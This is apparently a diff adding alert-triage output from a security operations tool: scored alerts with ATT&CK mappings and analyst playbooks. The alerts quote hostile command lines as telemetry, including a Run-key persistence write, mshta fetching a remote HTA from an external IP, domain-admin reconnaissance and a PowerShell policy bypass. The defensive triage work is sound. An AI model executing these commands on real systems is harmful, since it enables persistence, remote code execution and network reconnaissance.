+      "sla_minutes": 60,
+      "time": "2026-08-20T09:45:02",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "PERSIST-RUNKEY",
+      "rule": "Registry Run-key persistence",
+      "severity": "Medium",
+      "attack": "T1547.001",
+      "tactics": [
+        "Persistence"
+      ],
+      "primary_tactic": "Persistence",
+      "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OfficeUpdater /t REG_SZ /d \"C:\\Users\\Public\\a.exe\" /f",
+      "decoded": [],
+      "why": "An autorun value is written under a Run/RunOnce key so a program relaunches at logon, a common persistence mechanism.",
+      "intel_verdict": "unknown",
+      "indicators": [],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Medium",
+          "points": 30,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend analyst pickup within the SLA and a decision on containment.",
+      "playbook": [
+        "Enumerate autoruns, scheduled tasks and services created in the alert window.",
+        "Preserve the persistence artifact before removing it.",
+        "Verify the referenced binary's signature and hash.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0015",
+      "score": 60,
+      "raw_score": 60,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "sla_minutes": 240,
+      "time": "2026-08-20T02:17:44",
+      "user": "CORP\\svc_backup",
+      "account_type": "service",
+      "host": "SRV-BKP-01",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "LOLBIN-PROXY-EXEC",
+      "rule": "Signed-binary proxy execution (LOLBin)",
+      "severity": "Medium",
+      "attack": "T1218.005",
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "primary_tactic": "Defense Evasion",
+      "command_line": "mshta.exe http://192.0.2.47/maint.hta",
+      "decoded": [],
+      "why": "A signed Microsoft binary is used to execute remote script content, bypassing application allow-listing.",
+      "intel_verdict": "unknown",
+      "indicators": [
+        {
+          "type": "url",
+          "value": "http://192.0.2.47/maint.hta",
+          "role": "destination",
+          "via_decode": false,
+          "scope": null,
+          "verdict": "unknown",
+          "confidence": 0,
+          "provider": "n/a",
+          "note": "URL kept as context; its host is enriched separately"
+        },
+        {
+          "type": "ip",
+          "value": "192.0.2.47",
+          "role": "destination",
+          "via_decode": false,
+          "scope": "external",
+          "verdict": "unknown",
+          "confidence": 0,
+          "provider": "offline-snapshot (AbuseIPDB-shaped)",
+          "note": "No reputation data. Unknown is not the same as clean - it means nobody has reported it yet."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Medium",
+          "points": 30,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Context: 02:17 is outside business hours",
+          "points": 10,
+          "reason": "activity occurred outside configured business hours"
+        },
+        {
+          "label": "Context: service account",
+          "points": 12,
+          "reason": "a service account ran interactive-looking commands"
+        },
+        {
+          "label": "Context: external destination referenced",
+          "points": 8,
+          "reason": "the command line references a routable external address"
+        }
+      ],
+      "recommended_action": "Recommend queued investigation with the surrounding process tree.",
+      "playbook": [
+        "Verify endpoint protection is still enabled and reporting.",
+        "Review any exclusion paths that were added and remove unapproved ones.",
+        "Assume telemetry gaps for the period after the tampering.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0014",
+      "score": 60,
+      "raw_score": 60,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "sla_minutes": 240,
+      "time": "2026-08-20T09:50:12",
+      "user": "CORP\\mkaya",
+      "account_type": "standard",
+      "host": "SRV-FILE-02",
+      "source_ip": "10.20.7.41",
+      "source_scope": "internal",
+      "source_verdict": "internal",
+      "logon_type": "10",
+      "rule_id": "AUTH-RDP-FROM-WORKSTATION",
+      "rule": "Interactive logon to a server from a workstation",
+      "severity": "High",
+      "attack": "T1021.001",
+      "tactics": [
+        "Lateral Movement"
+      ],
+      "primary_tactic": "Lateral Movement",
+      "command_line": "",
+      "decoded": [],
+      "why": "A remote interactive (RDP) session was opened against a server, and the origin is an ordinary user workstation rather than an admin jump host. This is the shape of lateral movement with harvested credentials.",
+      "intel_verdict": "unknown",
+      "indicators": [
+        {
+          "type": "ip",
+          "value": "10.20.7.41",
+          "role": "source",
+          "via_decode": false,
+          "scope": "internal",
+          "verdict": "internal",
+          "confidence": 0,
+          "provider": "local",
+          "note": "internal address - no external reputation applies"
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: High",
+          "points": 50,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Context: session originated from another internal host (10.20.7.41)",
+          "points": 10,
+          "reason": "the session originated from another host on the internal network, which is the shape of lateral movement rather than local use"
+        }
+      ],
+      "recommended_action": "Recommend queued investigation with the surrounding process tree.",
+      "playbook": [
+        "Identify the origin host and treat it as compromised until proven otherwise.",
+        "Pull the authentication trail: which accounts authenticated from that origin, and to what.",
+        "Check whether the credential used here was exposed by an earlier alert on the origin host.",
+        "Map what the destination host gives access to before deciding on containment.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0011",
+      "score": 56,
+      "raw_score": 56,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "sla_minutes": 240,
+      "time": "2026-08-20T09:48:20",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "RECON-BURST",
+      "rule": "Host / domain reconnaissance command",
+      "severity": "Low",
+      "attack": "T1087",
+      "tactics": [
+        "Discovery"
+      ],
+      "primary_tactic": "Discovery",
+      "command_line": "whoami /all",
+      "decoded": [],
+      "why": "Built-in discovery commands attackers run soon after gaining access to map the host and domain. Benign individually; suspicious in bursts.",
+      "intel_verdict": "unknown",
+      "indicators": [],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Low",
+          "points": 10,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend queued investigation with the surrounding process tree.",
+      "playbook": [
+        "Correlate with the account's normal behaviour before escalating.",
+        "Discovery alone is weak evidence; look for what came before and after it.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0012",
+      "score": 56,
+      "raw_score": 56,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "sla_minutes": 240,
+      "time": "2026-08-20T09:48:26",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "RECON-BURST",
+      "rule": "Host / domain reconnaissance command",
+      "severity": "Low",
+      "attack": "T1018",
+      "tactics": [
+        "Discovery"
+      ],
+      "primary_tactic": "Discovery",
+      "command_line": "nltest /dclist:corp.local",
+      "decoded": [],
+      "why": "Built-in discovery commands attackers run soon after gaining access to map the host and domain. Benign individually; suspicious in bursts.",
+      "intel_verdict": "unknown",
+      "indicators": [],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Low",
+          "points": 10,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend queued investigation with the surrounding process tree.",
+      "playbook": [
+        "Correlate with the account's normal behaviour before escalating.",
+        "Discovery alone is weak evidence; look for what came before and after it.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0013",
+      "score": 56,
+      "raw_score": 56,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "sla_minutes": 240,
+      "time": "2026-08-20T09:48:31",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "RECON-BURST",
+      "rule": "Host / domain reconnaissance command",
+      "severity": "Low",
+      "attack": "T1087.002",
+      "tactics": [
+        "Discovery"
+      ],
+      "primary_tactic": "Discovery",
+      "command_line": "net group \"Domain Admins\" /domain",
+      "decoded": [],
+      "why": "Built-in discovery commands attackers run soon after gaining access to map the host and domain. Benign individually; suspicious in bursts.",
+      "intel_verdict": "unknown",
+      "indicators": [],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Low",
+          "points": 10,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend queued investigation with the surrounding process tree.",
+      "playbook": [
+        "Correlate with the account's normal behaviour before escalating.",
+        "Discovery alone is weak evidence; look for what came before and after it.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0016",
+      "score": 52,
+      "raw_score": 52,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "sla_minutes": 240,
+      "time": "2026-08-20T02:19:03",
+      "user": "CORP\\svc_backup",
+      "account_type": "service",
+      "host": "SRV-BKP-01",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "TASK-CREATE",
+      "rule": "Scheduled-task creation",
+      "severity": "Medium",
+      "attack": "T1053.005",
+      "tactics": [
+        "Persistence"
+      ],
+      "primary_tactic": "Persistence",
+      "command_line": "schtasks /create /tn \"BackupVerify\" /tr \"C:\\ProgramData\\bkp\\verify.exe\" /sc hourly /ru SYSTEM /f",
+      "decoded": [],
+      "why": "A scheduled task is registered to run a program on a trigger, used both for legitimate automation and for persistence.",
+      "intel_verdict": "unknown",
+      "indicators": [],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Medium",
+          "points": 30,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Context: 02:19 is outside business hours",
+          "points": 10,
+          "reason": "activity occurred outside configured business hours"
+        },
+        {
+          "label": "Context: service account",
+          "points": 12,
+          "reason": "a service account ran interactive-looking commands"
+        }
+      ],
+      "recommended_action": "Recommend queued investigation with the surrounding process tree.",
+      "playbook": [
+        "Enumerate autoruns, scheduled tasks and services created in the alert window.",
+        "Preserve the persistence artifact before removing it.",
+        "Verify the referenced binary's signature and hash.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0018",
+      "score": 43,
+      "raw_score": 43,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "sla_minutes": 240,
+      "time": "2026-08-20T14:05:47",
+      "user": "CORP\\admin_bt",
+      "account_type": "privileged",
+      "host": "WKSTN-0331",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "PS-HIDDEN-BYPASS",
+      "rule": "Execution-policy-bypass PowerShell",
+      "severity": "Medium",
+      "attack": "T1059.001",
+      "tactics": [
+        "Execution"
+      ],
+      "primary_tactic": "Execution",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File \\\\10.20.5.14\\deploy$\\Install-Agent.ps1 -DnsCheck 8.8.8.8",
+      "decoded": [],
+      "why": "PowerShell was launched with -ExecutionPolicy Bypass to run a script off a remote share. Common in both software deployment and malicious one-liners - confirm the share and the script are approved.",
+      "intel_verdict": "clean",
+      "indicators": [
+        {
+          "type": "ip",
+          "value": "10.20.5.14",
+          "role": "destination",
+          "via_decode": false,
+          "scope": "internal",
+          "verdict": "internal",
+          "confidence": 0,
+          "provider": "local",
+          "note": "internal address - no external reputation applies"
+        },
+        {
+          "type": "ip",
+          "value": "8.8.8.8",
+          "role": "destination",
+          "via_decode": false,
+          "scope": "external",
+          "verdict": "clean",
+          "confidence": 0,
+          "provider": "offline-snapshot (AbuseIPDB-shaped)",
+          "note": "Google Public DNS. Well-known infrastructure, treated as benign."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Medium",
+          "points": 30,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Threat intel: 8.8.8.8 (destination) = clean",
+          "points": -10,
+          "reason": "indicator is well-known benign infrastructure"
+        },
+        {
+          "label": "Context: privileged account",
+          "points": 15,
+          "reason": "the acting account matches a privileged-account pattern"
+        },
+        {
+          "label": "Context: external destination referenced",
+          "points": 8,
+          "reason": "the command line references a routable external address"
+        }
+      ],
+      "recommended_action": "Recommend queued investigation with the surrounding process tree.",
+      "playbook": [
+        "Decode and read the actual command before judging intent.",
+        "Determine whether the interpreter run is user-initiated or spawned by another process.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0017",
+      "score": 25,
+      "raw_score": 25,
+      "band": "Low",
+      "queue": "Tier 1 / batch review",
+      "sla_minutes": 1440,
+      "time": "2026-08-20T14:02:11",
+      "user": "CORP\\admin_bt",
+      "account_type": "privileged",
+      "host": "WKSTN-0331",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "B64-BLOB",
+      "rule": "Large Base64 blob",
+      "severity": "Low",
+      "attack": "T1027",
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "primary_tactic": "Defense Evasion",
+      "command_line": "$cert = [Convert]::ToBase64String((Get-Content -Encoding Byte .\\deploy\\signing.cer)); Set-Content .\\deploy\\signing.b64 $cert",
+      "decoded": [],
+      "why": "A long Base64 string was observed. Often benign (certificates, configuration), but also how payloads are smuggled - corroborating signal only.",
+      "intel_verdict": "unknown",
+      "indicators": [],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Low",
+          "points": 10,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Context: privileged account",
+          "points": 15,
+          "reason": "the acting account matches a privileged-account pattern"
+        }
+      ],
+      "recommended_action": "Recommend batch review; close with a note if the context is benign.",
+      "playbook": [
+        "Verify endpoint protection is still enabled and reporting.",
+        "Review any exclusion paths that were added and remove unapproved ones.",
+        "Assume telemetry gaps for the period after the tampering.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    }
+  ]
+}
